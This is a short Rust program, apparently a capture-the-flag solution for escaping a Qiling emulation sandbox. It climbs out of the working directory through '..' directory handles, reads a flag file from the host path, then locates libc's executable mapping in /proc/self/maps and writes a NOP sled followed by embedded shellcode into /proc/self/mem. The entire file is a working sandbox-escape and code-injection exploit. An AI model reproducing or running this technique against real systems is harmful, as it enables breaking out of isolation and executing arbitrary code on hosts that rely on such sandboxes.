use std::fs::File;
use std::fs::OpenOptions;
use std::io::BufRead;
use std::io::Read;
use std::io::Write;
use std::io::prelude::*;
use openat::*;
use std::os::unix::io::{FromRawFd, IntoRawFd, RawFd};
use std::io::SeekFrom;

fn main() {

    println!("Hello, world!");

    let dir = Dir::open(".").unwrap();

    let mut file = dir.write_file("./test", 0o644).unwrap();

    file.write("hello world".as_bytes()).unwrap();

    let mut file = dir.open_file("./test").unwrap();

    let mut buf : Vec<u8> = Vec::new();
    file.read_to_end(&mut buf).unwrap();

    println!("Value: {}", String::from_utf8_lossy(&buf));

    let file = dir.open_file("..").unwrap();
    let dir = unsafe { Dir::from_raw_fd(file.into_raw_fd()) };

    let file = dir.open_file("..").unwrap();
    let dir = unsafe { Dir::from_raw_fd(file.into_raw_fd()) };

    let mut file = dir.open_file("/home/b0re42/Programming/Random/escape_qiling_sandbox/flag").unwrap();

    let mut buf : Vec<u8> = Vec::new();
    file.read_to_end(&mut buf).unwrap();

    println!("Value: {}", String::from_utf8_lossy(&buf));

    let mut mappings = dir.open_file("/proc/self/maps").unwrap();
    mappings.read_to_end(&mut buf).unwrap();

    let target = buf
        .lines()
        .map(|f| f.unwrap())
        .filter(|l| l.contains("libc-") && l.contains("r-xp"))
        .next()
        .unwrap();

    println!("target mapping: {}", target);

    let start = target.split("-").next().unwrap();
    let start = u64::from_str_radix(start, 0x10).unwrap();

    let mut mem = dir.write_file("/proc/self/mem", 0o644).unwrap();
    mem.seek(SeekFrom::Start(start)).unwrap();

    let mut sc = vec![0x90; 0x1000];
    sc.extend(include_bytes!("../shellcode.bin"));

    mem.write_all(&sc).unwrap();
}
